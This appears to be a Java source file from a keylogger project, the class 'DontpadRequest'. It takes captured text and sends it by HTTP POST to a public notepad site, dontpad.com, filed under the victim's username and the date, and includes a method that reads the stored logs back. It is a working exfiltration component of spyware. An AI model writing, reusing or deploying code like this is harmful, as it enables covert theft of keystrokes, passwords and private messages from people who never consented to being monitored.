package handlers;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.Map;

public final class DontpadRequest {
	
	private final static String url = "http://dontpad.com/";
	private final static String defaultPath = "keylogger!1g0r";
	private final static String username = System.getProperty("user.name");

    public static void sendPost(String text) throws Exception {
    	
    	URL link = getUrl();
        
        Map<String,Object> params = new LinkedHashMap<>();
        params.put("text", text);

        StringBuilder postData = new StringBuilder();
        for (Map.Entry<String,Object> param : params.entrySet()) {
            if (postData.length() != 0) postData.append('&');
            postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
            postData.append('=');
            postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
        }
        byte[] postDataBytes = postData.toString().getBytes("UTF-8");

        HttpURLConnection conn = (HttpURLConnection)link.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
        conn.setDoOutput(true);
        conn.getOutputStream().write(postDataBytes);
        new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
    }

    
    public static String sendGet() throws Exception {
    	URL link = getUrl();
		BufferedReader in = new BufferedReader(new InputStreamReader(link.openConnection().getInputStream()));
		String inputLine;
		String html = null;
		while ((inputLine = in.readLine()) != null){
			html += inputLine; 
		}
		in.close();
		return html.split("textarea")[1].split(">")[1].split("<")[0];
    }
    
    
	private static URL getUrl() throws Exception {
		DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");
        URL link = new URL(url + defaultPath + "/" + username + "/" + dateFormat.format(new Date()));
		return link;
	}
}
